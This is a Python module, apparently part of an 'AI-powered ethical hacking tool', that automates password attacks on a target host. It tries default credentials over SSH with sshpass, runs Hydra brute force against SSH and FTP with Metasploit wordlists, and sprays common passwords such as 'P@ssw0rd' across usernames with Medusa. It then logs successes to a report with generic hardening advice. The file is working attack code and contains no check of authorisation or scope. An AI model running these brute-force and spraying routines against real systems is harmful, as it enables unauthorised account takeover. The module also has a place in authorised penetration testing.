"""
Password Attack Module

This module handles password attacks (brute force, dictionary attacks, spraying) for the AI-powered ethical hacking tool.
"""

import subprocess
import os
from modules import report_utils

def run(target, report_path=None, level='basic', credentials=None):
    """Run password attacks at the specified level and append results as a section in the unified report."""
    if report_path is None:
        report_path = report_utils.get_report_name(cve_id=None)
    report_utils.init_report(report_path, target)
    print(f"[PasswordAttack] Running password attacks on: {target} (level: {level})")
    findings = {}
    commands = []
    notable = []
    recommendations = []
    raw_output = {}

    # --- BASIC LEVEL ---
    methodology = [
        "Performed basic password attacks using common default credentials and small wordlists.",
    ]
    
    # Default credential testing
    default_creds = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('root', 'root'),
        ('root', 'password'),
        ('administrator', 'administrator'),
        ('guest', 'guest'),
        ('test', 'test'),
        ('user', 'user')
    ]
    
    for username, password in default_creds:
        # SSH default creds
        ssh_cmd = ['sshpass', '-p', password, 'ssh', '-o', 'ConnectTimeout=5', f'{username}@{target}']
        try:
            ssh_out = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=10)
            if ssh_out.returncode == 0:
                findings[f'ssh_{username}_{password}'] = "SUCCESS"
                notable.append(f"SSH login successful with {username}:{password}")
            else:
                findings[f'ssh_{username}_{password}'] = "FAILED"
        except Exception as e:
            findings[f'ssh_{username}_{password}'] = f"Error: {e}"
        commands.append(' '.join(ssh_cmd))

    # --- INTERMEDIATE LEVEL ---
    if level in ['intermediate', 'advanced']:
        methodology.append("Added Hydra for systematic brute force attacks and custom wordlists.")
        
        # Hydra SSH attack
        hydra_ssh_cmd = ['hydra', '-L', '/usr/share/wordlists/metasploit/unix_users.txt', 
                        '-P', '/usr/share/wordlists/metasploit/unix_passwords.txt', 
                        '-t', '4', target, 'ssh']
        try:
            hydra_ssh_out = subprocess.check_output(hydra_ssh_cmd, stderr=subprocess.STDOUT, text=True, timeout=300)
            findings['hydra_ssh'] = hydra_ssh_out
            raw_output['hydra_ssh'] = hydra_ssh_out
            commands.append(' '.join(hydra_ssh_cmd))
            if '[ssh] host:' in hydra_ssh_out:
                notable.append("Hydra SSH attack found valid credentials.")
        except Exception as e:
            findings['hydra_ssh'] = f"Error: {e}"
            raw_output['hydra_ssh'] = str(e)

        # Hydra FTP attack
        hydra_ftp_cmd = ['hydra', '-L', '/usr/share/wordlists/metasploit/unix_users.txt',
                        '-P', '/usr/share/wordlists/metasploit/unix_passwords.txt',
                        '-t', '4', target, 'ftp']
        try:
            hydra_ftp_out = subprocess.check_output(hydra_ftp_cmd, stderr=subprocess.STDOUT, text=True, timeout=300)
            findings['hydra_ftp'] = hydra_ftp_out
            raw_output['hydra_ftp'] = hydra_ftp_out
            commands.append(' '.join(hydra_ftp_cmd))
            if '[ftp] host:' in hydra_ftp_out:
                notable.append("Hydra FTP attack found valid credentials.")
        except Exception as e:
            findings['hydra_ftp'] = f"Error: {e}"
            raw_output['hydra_ftp'] = str(e)

    # --- ADVANCED LEVEL ---
    if level == 'advanced':
        methodology.append("Added password spraying, custom wordlists, and advanced attack techniques.")
        
        # Password spraying (same password across multiple users)
        spray_passwords = ['Password123', 'Summer2023', 'Winter2023', 'Admin123', 'P@ssw0rd']
        spray_users = ['admin', 'administrator', 'root', 'user', 'test', 'guest']
        
        for password in spray_passwords:
            for user in spray_users:
                spray_cmd = ['sshpass', '-p', password, 'ssh', '-o', 'ConnectTimeout=5', f'{user}@{target}']
                try:
                    spray_out = subprocess.run(spray_cmd, capture_output=True, text=True, timeout=10)
                    if spray_out.returncode == 0:
                        findings[f'spray_{user}_{password}'] = "SUCCESS"
                        notable.append(f"Password spray successful: {user}:{password}")
                    else:
                        findings[f'spray_{user}_{password}'] = "FAILED"
                except Exception as e:
                    findings[f'spray_{user}_{password}'] = f"Error: {e}"
                commands.append(' '.join(spray_cmd))

        # Medusa for additional protocols
        medusa_ssh_cmd = ['medusa', '-h', target, '-U', '/usr/share/wordlists/metasploit/unix_users.txt',
                         '-P', '/usr/share/wordlists/metasploit/unix_passwords.txt', '-M', 'ssh', '-t', '4']
        try:
            medusa_ssh_out = subprocess.check_output(medusa_ssh_cmd, stderr=subprocess.STDOUT, text=True, timeout=300)
            findings['medusa_ssh'] = medusa_ssh_out
            raw_output['medusa_ssh'] = medusa_ssh_out
            commands.append(' '.join(medusa_ssh_cmd))
            if 'SUCCESS' in medusa_ssh_out:
                notable.append("Medusa SSH attack found valid credentials.")
        except Exception as e:
            findings['medusa_ssh'] = f"Error: {e}"
            raw_output['medusa_ssh'] = str(e)

    # Recommendations
    recommendations.append("Implement strong password policies and multi-factor authentication.")
    if level in ['intermediate', 'advanced']:
        recommendations.append("Monitor for brute force attempts and implement account lockout policies.")
    if level == 'advanced':
        recommendations.append("Consider implementing password complexity requirements and regular password changes.")

    report_utils.append_section(
        report_path,
        section_title=f"Password Attacks ({level.title()})",
        methodology='\n'.join(methodology),
        commands=commands,
        findings=findings,
        notable=notable,
        recommendations=recommendations,
        raw_output=raw_output
    )
    return {
        "status": "success",
        "target": target,
        "report": report_path,
        "findings": findings,
        "notable": notable,
        "recommendations": recommendations,
        "level": level
    } 